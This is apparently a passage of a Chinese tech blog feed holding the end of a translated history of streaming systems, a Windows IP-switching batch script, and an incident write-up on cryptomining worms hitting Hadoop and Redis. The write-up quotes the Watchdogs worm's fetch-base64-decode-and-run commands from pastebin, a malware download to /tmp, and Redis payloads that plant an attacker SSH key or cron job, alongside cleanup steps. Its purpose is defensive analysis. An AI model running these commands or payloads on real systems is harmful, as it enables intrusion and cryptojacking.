SQL 语言本身的程序化等价物。</li><li>一组基于 SDK 的 DSL（特定于域的语言），提供专门的接口，以独特的方式描述模型在不同领域的接口设计。SDK 来描述上述模型处理能力的全集，但 DSL 描述一些特定领域的处理逻辑。 Beam 目前提供了一个名为 Scio 的 Scala DSL 和一个 SQL DSL，它们都位于现有 Java SDK 之上。</li><li>一组可以执行 Beam Pipeline 的执行引擎。执行引擎采用 Beam SDK 术语中描述的逻辑 Pipeline，并尽可能高效地将它们转换为可以执行的物理计划。目前，针对 Apex，Flink，Spark 和 Google Cloud Dataflow 存在对应的 Beam 引擎适配。在 SQL 术语中，您可以将这些引擎适配视为 Beam 在各种 SQL 数据库的实现，例如 Postgres，MySQL，Oracle 等。</li></ul><p>Beam 的核心愿景是实现一套可移植接口层，最引人注目的功能之一是它计划支持完整的跨语言可移植性。尽管最终目标尚未完全完成（但即将面市），让 Beam 在 SDK 和引擎适配之间提供足够高效的抽象层，从而实现 SDK 和引擎适配之间的任意切换。我们畅想的是，用 JavaScript SDK 编写的数据 Pipeline 可以在用 Haskell 编写的引擎适配层上无缝地执行，即使 Haskell 编写的引擎适配本身没有执行 JavaScript 代码的能力。</p><p>作为一个抽象层，Beam 如何定位自己和底层引擎关系，对于确保 Beam 实际为社区带来价值至关重要，我们也不希望看到 Beam 引入一个不必要的抽象层。这里的关键点是，Beam 的目标永远不仅仅是其所有底层引擎功能的交集（类似最小公分母）或超集（类似厨房水槽）。相反，它旨在为整个社区大数据计算引擎提供最佳的想法指导。这里面有两个创新的角度:</p><ul><li><strong>Beam 本身的创新</strong></li></ul><p>Beam 将会提出一些 API，这些 API 需要底层 runtime 改造支持，并非所有底层引擎最初都支持这些功能。这没关系，随着时间的推移，我们希望许多底层引擎将这些功能融入未来版本中 ; 对于那些需要这些功能的业务案例来说，具备这些功能的引擎通常会被业务方选择。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7f2cqotj20u00l4gnr.jpg" alt></p><p>这里举一个 Beam 里面关于 SplittableDoFn 的 API 例子，这个 API 可以用来实现一个可组合的，可扩展的数据源。（具体参看 Eugene Kirpichov 在他的文章《 “Powerful and modular I/O connectors with Splittable DoFn in Apache Beam》中描述 [图 10-34]）。它设计确实很有特点且功能强大，目前我们还没有看到所有底层引擎对动态负载均衡等一些更具创新性功能进行广泛支持。然而，我们预计这些功能将随着时间的推移而持续加入底层引擎支持的范围。</p><ul><li><strong>底层引擎的创新</strong></li></ul><p>底层引擎适配可能会引入底层引擎所独特的功能，而 Beam 最初可能并未提供 API 支持。这没关系，随着时间的推移，已证明其有用性的引擎功能将在 Beam API 逐步实现。</p><p>这里的一个例子是 Flink 中的状态快照机制，或者我们之前讨论过的 Savepoints。 Flink 仍然是唯一一个以这种方式支持快照的公开流处理系统，但是 Beam 提出了一个围绕快照的 API 建议，因为我们相信数据 Pipeline 运行时优雅更新对于整个行业都至关重要。如果我们今天推出这样的 API，Flink 将是唯一支持它的底层引擎系统。但同样没关系，这里的重点是随着时间的推移，整个行业将开始迎头赶上，因为这些功能的价值会逐步为人所知。这些变化对每个人来说都是一件好事。</p><p>通过鼓励 Beam 本身以及引擎的创新，我们希望推进整个行业快速演化，而不用再接受功能妥协。 通过实现跨执行引擎的可移植性承诺，我们希望将 Beam 建立为表达程序化数据处理流水线的通用语言，类似于当今 SQL 作为声明性数据处理的通用处理方式。这是一个雄心勃勃的目标，我们并没有完全实现这个计划，到目前为止我们还有很长的路要走。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我们对数据处理技术的十五年发展进行了蜻蜓点水般的回顾，重点关注那些推动流式计算发展的关键系统和关键思想。来，最后，我们再做一次总结：</p><ul><li><strong>MapReduce：可扩展性和简单性</strong> 通过在强大且可扩展的执行引擎之上提供一组简单的数据处理抽象，MapReduce 让我们的数据工程师专注于他们的数据处理需求的业务逻辑，而不是去构建能够适应在一大堆普通商用服务器上的大规模分布式处理程序。</li><li><strong>Hadoop：开源生态系统</strong> 通过构建一个关于 MapReduce 的开源平台，无意中创建了一个蓬勃发展的生态系统，其影响力所及的范围远远超出了其最初 Hadoop 的范围，每年有大量的创新性想法在 Hadoop 社区蓬勃发展。</li><li><strong>Flume：管道及优化</strong> 通过将逻辑流水线操作的高级概念与智能优化器相结合，Flume 可以编写简洁且可维护的 Pipeline，其功能突破了 MapReduce 的 Map→Shuffle→Reduce 的限制，而不会牺牲性能。</li><li><strong>Storm：弱一致性，低延迟</strong> 通过牺牲结果的正确性以减少延迟，Storm 为大众带来了流计算，并开创了 Lambda 架构的时代，其中弱一致的流处理引擎与强大一致的批处理系统一起运行，以实现真正的业务目标低延迟，最终一致型的结果。</li><li><strong>Spark: 强一致性</strong> 通过利用强大一致的批处理引擎的重复运行来提供无界数据集的连续处理，Spark Streaming 证明至少对于有序数据集的情况，可以同时具有正确性和低延迟结果。</li><li><strong>MillWheel：乱序处理</strong> 通过将强一致性、精确一次处理与用于推测时间的工具（如水印和定时器）相结合，MillWheel 做到了无序数据进行准确的流式处理。</li><li><strong>Kafka: 持久化的流式存储，流和表对偶性</strong> 通过将持久化数据日志的概念应用于流传输问题，Kafka 支持了流式数据可重放功能。通过对流和表理论的概念进行推广，阐明数据处理的概念基础。</li><li><strong>Cloud Dataflow：统一批流处理引擎</strong> 通过将 MillWheel 的无序流式处理与高阶抽象、自动优化的 Flume 相结合，Cloud Dataflow 为批流数据处理提供了统一模型，并且灵活地平衡正确性、计算延迟、成本的关系。</li><li><strong>Flink：开源流处理创新者</strong> 通过快速将无序流式数据处理的强大功能带到开源世界，并将其与分布式快照及保存点功能等自身创新相结合，Flink 提高了开源流处理的业界标准并引领了当前流式处理创新趋势。</li><li><strong>Beam: 可移植性</strong> 通过提供整合行业最佳创意的强大抽象层，Beam 提供了一个可移植 API 抽象，其定位为与 SQL 提供的声明性通用语言等效的程序接口，同时也鼓励在整个行业中推进创新。</li></ul><p>可以肯定的说，我在这里强调的这 10 个项目及其成就的说明并没有超出当前大数据的历史发展。但是，它们对我来说是一系列重要且值得注意的大数据发展里程碑，它共同描绘了过去十五年中流处理演变的时间轴。自最早的 MapReduce 系统开始，尽管沿途有许多起伏波折，但不知不觉我们已经走出来很长一段征程。即便如此，在流式系统领域，未来我们仍然面临着一系列的问题亟待解决。正所谓：路漫漫其修远兮，吾将上下而求索。</p></li></ol></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;文章原作者是Google MapReduce小组的一员，翻译自《Streaming System》最后一章《The Evolution of Large-Scale Data Processing》，翻译者是 陈守元（花名：巴真），阿里巴巴高级产品专家。阿里巴巴实时计算团队产品负责人。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我最近看了一些深度学习的文章，有一些感触，机器学习的使用范围确实很有限，大众以为现在的AI和现在实际上的AI其实根本不是一个东西，如果机器学习能在短时间内迅速发展起来，我个人觉得只有两种可能：第一种可能：要么横向在某个传统行业取得巨大进展，被其他行业纷纷效仿，但是很难，机器学习需要都整体数据有一个完全的把控，只有已经自动化相当完备的行业才有使用机器学习的基础，更何况还有行业壁垒，从中盈利的公司可能根本不会宣传，别的人也就无从得知了。&lt;/p&gt;
&lt;p&gt;第二种可能：深度学习出现重大进展，深度学习作为黑盒使用是一件很离谱的事情，理论上来说要解析深度学习的原理需要很多别的学科来进行理论支持，短时间内出现重大进展其实可能也不大。&lt;/p&gt;
&lt;p&gt;那么如果AI这阵风最终没有刮起来，那么还是要看流处理的了。&lt;/p&gt;
&lt;p&gt;下面是原文：&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Reading notes" scheme="http://yoursite.com/categories/Reading-notes/"/>
    
      <category term="技术发展史" scheme="http://yoursite.com/categories/Reading-notes/%E6%8A%80%E6%9C%AF%E5%8F%91%E5%B1%95%E5%8F%B2/"/>
    
    
      <category term="Reading notes" scheme="http://yoursite.com/tags/Reading-notes/"/>
    
      <category term="大数据" scheme="http://yoursite.com/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
      <category term="流式计算" scheme="http://yoursite.com/tags/%E6%B5%81%E5%BC%8F%E8%AE%A1%E7%AE%97/"/>
    
      <category term="大数据浪潮史" scheme="http://yoursite.com/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%B5%AA%E6%BD%AE%E5%8F%B2/"/>
    
  </entry>
  
  <entry>
    <title>win环境下更换IP的批处理</title>
    <link href="http://yoursite.com/2019/06/18/%E6%89%B9%E5%A4%84%E7%90%86%E6%9B%B4%E6%94%B9IP/"/>
    <id>http://yoursite.com/2019/06/18/批处理更改IP/</id>
    <published>2019-06-18T07:40:44.237Z</published>
    <updated>2019-05-09T06:45:42.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>之前公司IP地址出了点问题，要两个IP来回切换，找了个脚本一运行就出现问题，这边记录一下<br>脚本里面的网络名称尽量用英文的，先去网络适配里面更改一下，因为我这边尝试用原来的“本地连接”名字会出现乱码的情况，可能和命令行的编码有关</p></blockquote><a id="more"></a> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">cls</span><br><span class="line">color 0A</span><br><span class="line"> </span><br><span class="line">@echo off</span><br><span class="line">echo.</span><br><span class="line">echo ===change IP?==</span><br><span class="line">echo.</span><br><span class="line">echo 1:auto</span><br><span class="line">echo.</span><br><span class="line">echo 2:zt</span><br><span class="line">echo.</span><br><span class="line">echo.</span><br><span class="line">set/p sel=changestyle</span><br><span class="line">if &quot;%sel%&quot;==&quot;1&quot; goto auto</span><br><span class="line">if &quot;%sel%&quot;==&quot;2&quot; goto zt</span><br><span class="line">echo you dont choose</span><br><span class="line">goto end</span><br><span class="line"> </span><br><span class="line">:auto</span><br><span class="line">netsh interface ip set address name=&quot;local connection&quot; source=dhcp</span><br><span class="line">netsh interface ip delete dns &quot;local connection&quot; all</span><br><span class="line">ipconfig /flushdns</span><br><span class="line">ipconfig /all</span><br><span class="line">goto end</span><br><span class="line"> </span><br><span class="line">:zt</span><br><span class="line">echo waiting...</span><br><span class="line">netsh interface ip set address name=&quot;local connection&quot; source=static addr=10.0.20.22 mask=255.255.248.0 gateway=10.0.16.1 gwmetric=1</span><br><span class="line">netsh interface ip set dns name=&quot;local connection&quot; source=static addr=222.96.134.133</span><br><span class="line">netsh interface ip add dns name=&quot;local connection&quot; addr=222.96.128.68 index=2 </span><br><span class="line">ipconfig /flushdns</span><br><span class="line">ipconfig /all</span><br><span class="line">echo finish</span><br><span class="line">goto end</span><br><span class="line"> </span><br><span class="line">:end</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>IP地址是我随便写的，修改IP，保存为.bat后，修改本地连接名称，管理员运行就可以执行</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;之前公司IP地址出了点问题，要两个IP来回切换，找了个脚本一运行就出现问题，这边记录一下&lt;br&gt;脚本里面的网络名称尽量用英文的，先去网络适配里面更改一下，因为我这边尝试用原来的“本地连接”名字会出现乱码的情况，可能和命令行的编码有关&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Win" scheme="http://yoursite.com/categories/Win/"/>
    
      <category term="IP Change" scheme="http://yoursite.com/categories/Win/IP-Change/"/>
    
    
      <category term="Win" scheme="http://yoursite.com/tags/Win/"/>
    
      <category term="Tips" scheme="http://yoursite.com/tags/Tips/"/>
    
  </entry>
  
  <entry>
    <title>hadoop病毒案例分析</title>
    <link href="http://yoursite.com/2019/06/18/%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2019/06/18/大数据病毒分析/</id>
    <published>2019-06-18T07:40:44.230Z</published>
    <updated>2019-05-10T03:02:03.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>京东云和公司集群分别遇到过一次挖矿脚本，经过分析，发现两次挖矿事件有所不同，在这篇文档记录下两次挖矿事件的异同、总结和反思。</p></blockquote><a id="more"></a> <h3 id="第二次事件分析"><a href="#第二次事件分析" class="headerlink" title="第二次事件分析"></a>第二次事件分析</h3><p>我遇到的两次挖矿事件分别是由于<code>Hadoop Yarn REST API</code>未授权漏洞和<code>Redis</code>未授权访问漏洞这两种常见的配置问题引发的。</p><p>目前可以确定的是，第二次遇到的是Watchdogs蠕虫，这种蠕虫病毒第一次发现是2019年2月20日，阿里云安全监测到一起大规模挖矿事件，判断为Watchdogs蠕虫导致，该蠕虫短时间内即造成大量Linux主机沦陷，一方面是利用Redis未授权访问和弱密码这两种常见的配置问题进行传播，另一方面从known_hosts文件读取ip列表，用于登录信任该主机的其他主机。这两种传播手段都不是第一次用于蠕虫，但结合在一起爆发出巨大的威力。</p><p>蠕虫感染路径如下图：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v117hz8tj20z80iygok.jpg" alt></p><p>蠕虫传播方式：</p><p>攻击者首先扫描存在未授权访问或弱密码的Redis，并控制相应主机去请求以下地址：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pastebin.com/raw/sByq0rym</span><br></pre></td></tr></table></figure><p>该地址包含的命令是请求、base64解码并执行另一个url地址的内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(curl -fsSL https://pastebin.com/raw/D8E71JBJ||wget -q -O- https://pastebin.com/raw/D8E71JBJ)|base64 -d|sh</span><br></pre></td></tr></table></figure><p>而<a href="https://pastebin.com/raw/D8E71JBJ" target="_blank" rel="noopener">https://pastebin.com/raw/D8E71JBJ</a> 的内容解码后为一个bash脚本，脚本中又包含下载恶意程序Watchdogs的指令。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(curl -fsSL http://thyrsi.com/t6/672/1550667479x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667479x1822611209.jpg -O /tmp/watchdogs) &amp;&amp; chmod +x /tmp/watchdogs</span><br></pre></td></tr></table></figure><p>如上图所示，本次蠕虫的横向传播分为两块。</p><p>一是Bash脚本包含的如下内容，会直接读取主机上的/root/.ssh/known_hosts和/root/.ssh/id_rsa.pub文件，用于登录信任当前主机的机器，并控制这些机器执行恶意指令。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v13zzr57j20ix036my8.jpg" alt></p><p>二是Bash脚本下载的Watchdogs程序，通过对Redis的未授权访问和爆破、以及对SSH的爆破，进行横向传播。</p><p>具体为表现为，Watchdogs程序的Bbgo()函数中，首先获取要攻击的ip列表，随后尝试登录其他主机的ssh服务，一旦登录成功则执行恶意脚本下载命令。在Ago()函数中，则表现为针对其他主机Redis的扫描和攻击。</p><p>恶意Bash脚本</p><p>除了下载Watchdogs程序和横向传播外，Bash脚本还具有以下几项功能。</p><ol><li><p>将下载自身的指令添加到crontab定时任务里面，定时执行。</p></li><li><p>杀死同类的挖矿僵尸木马进程。</p></li><li><p>杀死CPU占用大于80%的进程</p></li></ol><p>bash脚本的功能也很很常见，一般来说挖矿程序几乎都有这样的功能。</p><p>Watchdogs程序为elf可执行文件，由go语言编译，其主要函数结构如下所示：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v14wnj8cj207v09nq2w.jpg" alt></p><p>1.<code>LibiosetWrite()</code></p><p>该函数主要执行libioset.so文件的写入</p><p>2.<code>Cron()</code></p><p>将恶意下载命令添加到/etc/cron.d/root等多个文件中，定时执行，加大清理难度</p><p>3.<code>KsoftirqdsWriteRun()</code></p><p>解压并写入挖矿程序及其配置文件</p><p>Bbgo()和Ago()函数的功能在“蠕虫传播方式”一节已有介绍，此处不再赘述。</p><p>综上，Watchdogs程序在Bash脚本执行的基础上，将进一步进行挖矿程序的释放和执行、恶意so文件写入以及剩余的横向传播。</p><p><code>libioset.so</code>分析</p><p>如图是<code>libioset.so</code>的导出函数表，包括<code>unlink</code>, <code>rmdir</code>, <code>readdir</code>等。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v1627gnej20rs0lqaay.jpg" alt></p><p>这里以执行rm命令必须调用的unlink()函数为例。</p><p>它只对不包含”ksoftirqds”、”ld.so.preload”、”libioset.so”这几个字符串的文件调用正常的unlink()，导致几个文件无法被正常删除。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v16ez6vbj2192042js9.jpg" alt></p><p>其他几个命令，如<code>readdir</code>也是类似，无法正常返回关于恶意程序的结果。</p><p>而<code>fopen</code>函数更是变本加厉，由于系统查询<code>cpu</code>使用情况和端口占用情况时，都会调用<code>fopen</code>，于是攻击者<code>hook</code>了这一函数，使其在读取<code>&#39;/proc/stat&#39;</code>和<code>&#39;/proc/net/tcp&#39;</code>等文件时，调用伪造函数。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v1737f5rj20r602qwez.jpg" alt></p><p>其中<code>forge_proc_cpu()</code>函数，将返回硬编码的字符串</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v17j9t4kj21c80eo0ul.jpg" alt></p><p>这种对查看系统状态功能的恶意hook，导致用户难以通过简单自查，确定挖矿是否存在以及挖矿进程是哪个。</p><p>“许多黑客模仿我的代码”——数据库蠕虫趋势统计</p><p>此次的Watchdogs挖矿蠕虫与18年出现的kworkerd蠕虫出自同一位作者（关于kworkerd挖矿僵尸网络参见《2018年云上挖矿分析报告》），因为它们使用了相同的钱包地址和相似的攻击手法。此外作者在恶意脚本末尾的注释也印证了这点：</p><p>#1.If you crack my program, please don’t reveal too much code online.Many hacker boys have copied my kworkerds code,more systems are being attacked.(Especially libioset)…</p><p>这段注释同时也揭露了一个事实，“许多黑客模仿我的代码”——当一个攻击者采取了某种攻击手法并取得成功，其他攻击者会纷纷模仿，很快将该手段加入自己的“攻击大礼包”。</p><p>这种模仿的结果是，据阿里云安全不完全统计，利用Redis未授权访问等问题进行攻击的蠕虫，数量已从2018年中的一个，上涨到如今的40余个，其中不乏DDG、8220这样臭名昭著的挖矿团伙。此外大部分近期新出现的蠕虫，都会加上Redis利用模块，因为实践证明互联网上错误配置的Redis数据库数量庞大，能从其中分一杯羹，攻击者的盈利就能有很大的提升。</p><p>因而如果不保护好Redis，用户面临的将不是一个蠕虫，而是40余个蠕虫此起彼伏的攻击。</p><p>下图所示为近半年来，针对Redis的攻击流量和目标机器数量趋势，从中不难看出Redis攻击逐渐被各大僵尸网络采用，并在2018年10月11月保持非常高的攻击量；而后在经历了3个月左右的沉寂期后，在今年2月再次爆发。</p><p>而Redis本身遭受攻击的主流方法也经过了三个阶段</p><p>1.攻击者对存在未授权访问的Redis服务器写入ssh key，从而可以畅通无阻登录ssh服务</p><p>具体为执行以下payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">set x "\n\n\nssh-rsa 【sshkey】 root@kali\n\n\n"</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>其中【sshkey】表示攻击者的密钥</p><p>2.攻击者对存在未授权访问的<code>Redis</code>服务器写入<code>crontab</code>文件，定时执行恶意操作</p><p>具体为执行以下<code>payload</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">set x "【evil command】"</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>3.以上两个阶段中仅对<code>Redis</code>完全没有验证即可访问的情况，第三个阶段则开始针对设置了密码验证，但密码较弱的<code>Redis</code>进行攻击，受害范围进一步扩大。</p><p>然而<code>Redis</code>并不是唯一一个受到黑客“青眼”的数据库。如下表所示，<code>SQL Server</code>, <code>Mysql</code>, <code>Mongodb</code>这些常用数据库的安全问题，也被多个挖矿僵尸网络所利用；利用方式集中在未授权访问、密码爆破和漏洞利用。</p><h3 id="处理办法"><a href="#处理办法" class="headerlink" title="处理办法"></a>处理办法</h3><p>1.首先停止<code>cron</code>服务，避免因其不断执行而导致恶意文件反复下载执行。</p><p>如果操作系统可以使用service命令，则执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service crond stop</span><br></pre></td></tr></table></figure><p>如果没有service命令，执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/cron stop</span><br></pre></td></tr></table></figure><p>2.随后使用<code>busybox</code>删除以下两个so文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo busybox rm -f /etc/ld.so.preload</span><br><span class="line">sudo busybox rm -f /usr/local/lib/libioset.so</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure><p><code>busybox</code>是一个小巧的<code>unix</code>工具集，许多<code>Linux</code>系统装机时已集成。使用它进行删除是因为系统自带的<code>rm</code>命令需要进行动态<code>so</code>库调用，而<code>so</code>库被恶意<code>hook</code>了，无法进行正常删除；而<code>busybox</code>的<code>rm</code>是静态编译的，无需调用<code>so</code>文件，所以不受影响。</p><p>3.清理恶意进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo kill -9 `ps -ef|grep Watchdogs|grep -v grep |awk '&#123;print $2&#125;'`</span><br><span class="line">sudo kill -9 `ps -ef|grep ksoftirqds|grep -v grep |awk '&#123;print $2&#125;'`</span><br></pre></td></tr></table></figure><p>4.清理cron相关文件，重启服务，具体为检查以下文件并清除其中的恶意指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/crontabs/root</span><br><span class="line">/var/spool/cron/root</span><br><span class="line">/etc/cron.d/root</span><br></pre></td></tr></table></figure><p>之后执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service crond start</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/cron start</span><br></pre></td></tr></table></figure><p>如果执行了以上操作任然发现有挖矿程序在运行的话，基本可以判断为机器上任然有病毒程序没有删除干净，对症下药即可。</p><h3 id="来自阿里云的安全建议"><a href="#来自阿里云的安全建议" class="headerlink" title="来自阿里云的安全建议"></a>来自阿里云的安全建议</h3><p>数字加密货币的获取依赖计算资源的特质，催生了黑客进行大规模入侵的动机和土壤；类似Watchdogs蠕虫这样的数据库入侵事件，不是第一起，也不会是最后一起。阿里云作为“编写时即考虑安全性”的平台，提供良好的安全基础设施和丰富的安全产品，帮助用户抵御挖矿和入侵，同时提供以下安全建议：</p><ol><li>在入侵发生之前，加强数据库服务的密码，尽量不将数据库服务开放在互联网上，或根据实际情况进行访问控制（<code>ACL</code>）。这些措施能够帮助有效预防挖矿、勒索等攻击。平时还要注意备份资料，重视安全产品告警。</li><li><p>如果怀疑主机已被入侵挖矿，对于自身懂安全的用户，在攻击者手段较简单的情况下，可以通过自查<code>cpu</code>使用情况、运行进程、定时任务等方式，锁定入侵源头。</p></li><li><p>针对云上的环境，对于攻击者采用较多隐藏手段的攻击（如本次的<code>Watchdogs</code>蠕虫，使<code>ps</code>、<code>top</code>等系统命令失效），建议使用阿里云安全的下一代云防火墙产品，其阻断恶意外联、能够配置智能策略的功能，能够有效帮助防御入侵。哪怕攻击者在主机上的隐藏手段再高明，下载、挖矿、反弹shell这些操作，都需要进行恶意外联；云防火墙的拦截将彻底阻断攻击链。此外，用户还可以通过自定义策略，直接屏蔽<code>pastebin.com</code>、<code>thrysi.com</code>等广泛被挖矿蠕虫利用的网站，达到阻断入侵的目的。</p></li></ol><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v1iwxf04j22uk0n4tbu.jpg" alt></p><p>如图是云防火墙帮助用户拦截此次<code>Watchdogs</code>蠕虫下载的例子，图中共拦截23次对<code>pastebin.com</code>的请求；这些拦截导致主机未下载恶意脚本，从而就不会发起对<code>thrysi.com</code>的请求，故规则命中次数为0。</p><ol start="4"><li>对于有更高定制化要求的用户，可以考虑使用阿里云安全管家服务。购买服务后将有经验丰富的安全专家提供咨询服务，定制适合您的方案，帮助加固系统，预防入侵。入侵事件发生后，也可介入直接协助入侵后的清理、事件溯源等，适合有较高安全需求的用户，或未雇佣安全工程师，但希望保障系统安全的企业。</li></ol><h3 id="第一次事件分析"><a href="#第一次事件分析" class="headerlink" title="第一次事件分析"></a>第一次事件分析</h3><p>以上记录的是第二次的挖矿事件，两次挖矿事件有一些区别，第一次<code>hadoop</code>集群上遇到的挖矿事件，被利用的漏洞是yarn提交的漏洞，整个感染流程如下：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v1ogyzquj20mo09sab7.jpg" alt></p><p>第二次遇到的漏洞是<code>redis</code>上的漏洞，第二次的挖矿事件更为复杂，简单的Linux命令已经被病毒屏蔽，需要更为复杂的操作才能发现问题的根源。第一次挖矿事件和第二次挖矿事件有一点不同就是第一次的挖矿事件中，在删除<code>crontab</code>命令，删除挖矿脚本之后，仍然出现挖矿操作，通过分析、思考挖矿的逻辑，说明在<code>crontab</code>之前应该还有一层在控制进程，通过分析<code>status</code>之后，果然发现有好几个异常连接，分别是指向荷兰和美国，在<code>iptables</code>里面把这些<code>ip</code>屏蔽掉之后就解决了问题。</p><p>同时这边提供应急解决思路，如果急需使用集群的话，可以根据这些挖矿病毒的特点——<code>CPU</code>高占用，写一个定期删除<code>CPU</code>占用超过<code>95</code>进程的脚本，同样用<code>Crontab</code>定期执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/sh</span><br><span class="line"></span><br><span class="line">NAME=$1</span><br><span class="line">echo $NAME</span><br><span class="line"><span class="meta">#</span>ID=`ps -ef | grep "$NAME" | grep -v "$0" | grep -v "grep" | awk '&#123;print $2&#125;'`</span><br><span class="line">CPU=`ps -aux | grep kworker | sort -rn -k +3 | head -1 | awk &#123;'print $3'&#125; | awk -F. '&#123;print $1&#125;'`</span><br><span class="line">ID=`ps -aux | grep kworker  | sort -rn -k +3 | head -1 | awk &#123;'print $2'&#125;`</span><br><span class="line">echo $CPU</span><br><span class="line">echo $ID</span><br><span class="line">echo "---------------"</span><br><span class="line">sleep 1s</span><br><span class="line">if [ $CPU -ge 95 ]; then</span><br><span class="line">   echo "killed $ID"</span><br><span class="line">   kill -9 $ID</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>然后<code>crontab -e</code>执行定时任务每分钟执行该脚本</p><p><code>crontab -e</code></p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /etc/init.d/killprocess.sh</span><br></pre></td></tr></table></figure><p>### </p><p>币圈多少也涉及一点，之前<code>BTC</code>劫持软件劫持下来的<code>BTC</code>所在地址根本没动，确实这个钱没有办法提现，应该时刻都被监控着。所以这次接触的挖矿脚本涉及的都是带匿名属性的数字货币。区块链在17 18年刮起的一阵风暴不知道还有没有后续了。</p><p>最后附上阿里云2019年1月发布的云上挖矿分析报告（双击打开）。</p><p><a href="https://paper.seebug.org/806/" target="_blank" rel="noopener">阿里云上挖矿分析报告</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;京东云和公司集群分别遇到过一次挖矿脚本，经过分析，发现两次挖矿事件有所不同，在这篇文档记录下两次挖矿事件的异同、总结和反思。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Hadoop" scheme="http://yoursite.com/categories/Hadoop/"/>
    
      <category term="Security" scheme="http://yoursite.com/categories/Hadoop/Security/"/>
    
    
      <category term="病毒" scheme="http://yoursite.com/tags/%E7%97%85%E6%AF%92/"/>
    
